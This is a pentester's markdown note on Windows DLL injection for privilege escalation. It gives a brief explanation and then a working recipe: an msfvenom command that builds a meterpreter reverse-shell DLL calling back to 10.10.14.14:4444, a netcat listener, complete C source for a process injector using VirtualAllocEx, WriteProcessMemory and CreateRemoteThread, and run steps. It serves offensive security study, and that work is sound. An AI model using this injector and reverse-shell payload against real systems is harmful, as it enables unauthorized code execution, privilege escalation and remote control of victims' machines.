---
title: DLL Injection
category: win privesc
order: 1
---

[WPE-03 - DLL Injection](https://pentestlab.blog/2017/04/04/dll-injection/)

DLL injection is a technique which allows an attacker to run arbitrary code in the context of the address space of another process. If this process is running with excessive privileges then it could be abused by an attacker in order to execute malicious code in the form of a DLL file in order to elevate privileges.

Specifically this technique follows the steps below:

1.  A DLL needs to be dropped into the disk
2.  The “CreateRemoteThread” calls the “LoadLibrary”
3.  The reflective loader function will try to find the Process Environment Block (PEB) of the target process using the appropriate CPU register and from that will try to find the address in memory of kernel32dll and any other required libraries.
4.  Discovery of the memory addresses of required API functions such as LoadLibraryA, GetProcAddress, and VirtualAlloc.
5.  The functions above will be used to properly load the DLL into memory and call its entry point DllMain which will execute the DLL.

# Manual exploitation
---

## 1 create dll
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=4444 -f dll -o evil.dll
```
## 2 set up listener
```
nc -nlvp 4444
```

## 3 compile code :
```
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
	HANDLE processHandle;
	PVOID remoteBuffer;
	wchar_t dllPath[] = TEXT("C:\\users\\nop\\evil.dll");

	printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
	PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
	CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
	CloseHandle(processHandle);

	return 0;
}
```
## 4 find a process id to inject
```
tasklist
```

## 5 transfer and run  dll-injector.exe
```
dll-injector.exe <PID>
```

## 6 TODO
cambiar el codigo para pasarle por parametro el path al dll
